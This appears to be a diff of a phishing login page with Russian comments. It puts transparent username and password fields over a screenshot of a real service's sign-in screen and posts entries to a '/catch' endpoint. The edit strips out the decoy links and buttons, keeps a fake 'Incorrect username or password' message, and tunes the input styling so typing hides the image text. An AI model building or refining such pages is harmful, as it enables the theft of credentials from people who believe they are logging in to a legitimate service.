@@ -10,6 +10,7 @@
             background-size: cover;
             background-position: center;
             background-repeat: no-repeat;
+            
             color: #ffffff;
             font-family: Arial, sans-serif;
             display: flex;
@@ -27,10 +28,6 @@
             padding: 0;
             margin-top: -35px;
             box-sizing: border-box;
-        }
-
-        h1, .link-text, .signup-text {
-            display: none !important;
         }
 
         form {
@@ -53,12 +50,11 @@
             transition: background-color 0.1s ease;
         }
 
-        /* Когда поле пустое — оно прозрачное (видна надпись с картинки) */
         .input-control::placeholder {
             color: transparent;
         }
 
-        /* Когда поле в фокусе или в него что-то ввели — оно заливается темным цветом и перекрывает фон картинки */
+        /* Заливка при клике и вводе для перекрытия текста с картинки */
         .input-control:focus,
         .input-control:not(:placeholder-shown) {
             background-color: #191b1d !important;
@@ -75,23 +71,6 @@
             color: transparent;
         }
 
-        .secondary-actions {
-            display: flex;
-            flex-direction: column;
-            gap: 10px;
-            margin-top: 50px;
-        }
-
-        .btn-secondary {
-            width: 100%;
-            height: 36px;
-            background: transparent !important;
-            border: none !important;
-            outline: none !important;
-            cursor: pointer;
-            color: transparent;
-        }
-
         .error-message {
             display: none;
         }
@@ -101,23 +80,11 @@
 
     <div class="auth-container">
         <form action="/catch" method="POST" novalidate>
-            <!-- Добавлены placeholder=" " (пробелы), чтобы селектор :not(:placeholder-shown) работал корректно -->
             <input type="text" name="username" class="input-control" placeholder=" " required autocomplete="off">
             <input type="password" name="password" class="input-control" placeholder=" " required autocomplete="off">
             <div class="error-message">Incorrect username or password.</div>
             <button type="submit" class="btn-submit">Log In</button>
         </form>
-
-        <a href="#" class="link-text">Forgot Password or Username?</a>
-        
-        <div class="secondary-actions">
-            <button type="button" class="btn-secondary">Email Me a One-Time Code</button>
-            <button type="button" class="btn-secondary">Quick Sign-In</button>
-        </div>
-        
-        <div class="signup-text">
-            Don't have an account? <a href="#">Sign Up</a>
-        </div>
     </div>
 
 </body>
